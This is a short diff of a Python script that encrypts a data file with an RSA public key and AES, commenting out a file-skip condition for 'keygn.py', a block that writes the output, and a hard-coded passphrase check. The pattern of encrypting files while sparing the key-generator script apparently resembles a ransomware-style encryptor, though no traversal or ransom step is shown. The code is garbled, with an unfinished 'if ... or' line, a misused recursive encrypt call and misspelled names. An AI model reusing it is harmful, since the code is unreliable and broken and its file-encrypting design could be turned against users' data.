@@ -6,8 +6,8 @@ from cryptography.hazmat.primitives.asymmetric import padding
 from Crypto.Cipher import PKCS1_OAEP, AES
 
 # Public key with base 64 encoding
-if file == "keygn.py" or 
-    continue
+# if file == "keygn.py" or 
+    # continue
 
 pubkey = '''Enter key'''
 pubkey = base64.b64decode(pubkey)
@@ -45,10 +45,10 @@ def encrypt(dataFile, publicKey):
     ciphertext, tag = cipher.encrypt_and_digest(data)
 
     # Save the encrypted data to file 
-    encypt = encrypt(data)
-    with open("encrypt","wb") as f:
-        f.write(encrypt)
+#     encypt = encrypt(data)
+#     with open("encrypt","wb") as f:
+#         f.write(encrypt)
 
 
-passphress =  "cofffe"
-if usepasss == passphress:
+# passphress =  "cofffe"
+# if usepasss == passphress:
